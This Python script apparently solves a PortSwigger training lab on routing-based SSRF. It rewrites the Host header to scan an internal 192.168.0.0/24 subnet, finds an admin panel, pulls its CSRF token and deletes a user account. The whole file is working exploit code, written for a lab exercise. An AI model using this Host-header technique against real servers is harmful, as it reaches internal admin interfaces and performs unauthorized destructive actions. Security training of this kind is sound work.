#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Routing-based SSRF.

The front-end routes requests based on the Host header. Setting Host to an
internal IP makes the front-end proxy the request to that internal server.

Steps:
  1. Scan 192.168.0.0/24 to find the internal admin server.
  2. Fetch /admin to get the CSRF token.
  3. POST /admin/delete with the CSRF token and Referer header to delete carlos.

NOTE: Requires HTTP/1.1. The requests library uses HTTP/1.1 by default.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def scan_subnet(lab, session_cookie, lab_cookie, subnet="192.168.0", timeout=5):
    print(f"[*] Scanning {subnet}.0/24 ...")
    cookies = {"session": session_cookie, "_lab": lab_cookie}
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        try:
            r = requests.get(
                lab, headers={"Host": ip}, cookies=cookies,
                verify=False, timeout=timeout, allow_redirects=False
            )
            if r.status_code == 200 and "admin" in r.text.lower():
                print(f"[+] Admin server found: {ip} (status {r.status_code})")
                return ip
            elif r.status_code not in (504, 502, 500):
                print(f"[*] {ip} → {r.status_code}")
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
    return None


def fetch_csrf(lab, internal_ip, session_cookie, lab_cookie):
    cookies = {"session": session_cookie, "_lab": lab_cookie}
    r = requests.get(
        f"{lab}/admin",
        headers={"Host": internal_ip},
        cookies=cookies,
        verify=False,
    )
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else None


def delete_carlos(lab, internal_ip, csrf_token, session_cookie, lab_cookie):
    cookies = {"session": session_cookie, "_lab": lab_cookie}
    r = requests.post(
        f"{lab}/admin/delete",
        headers={
            "Host": internal_ip,
            "Referer": f"http://{internal_ip}/admin",
        },
        cookies=cookies,
        data={"csrf": csrf_token, "username": "carlos"},
        verify=False,
    )
    return r.status_code


def main():
    parser = argparse.ArgumentParser(
        description="Solve Routing-Based SSRF lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("lab_cookie", help="_lab cookie value")
    parser.add_argument("--internal-ip", help="Known internal admin IP (skips scan)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    internal_ip = args.internal_ip
    if not internal_ip:
        internal_ip = scan_subnet(lab, args.session, args.lab_cookie)
    if not internal_ip:
        print("[-] Internal admin server not found.")
        return

    csrf = fetch_csrf(lab, internal_ip, args.session, args.lab_cookie)
    if not csrf:
        print("[-] CSRF token not found.")
        return
    print(f"[+] CSRF token: {csrf}")

    status = delete_carlos(lab, internal_ip, csrf, args.session, args.lab_cookie)
    if status in (200, 302):
        print("[+] Carlos deleted — lab solved!")
    else:
        print(f"[-] Delete returned {status}")


if __name__ == "__main__":
    main()
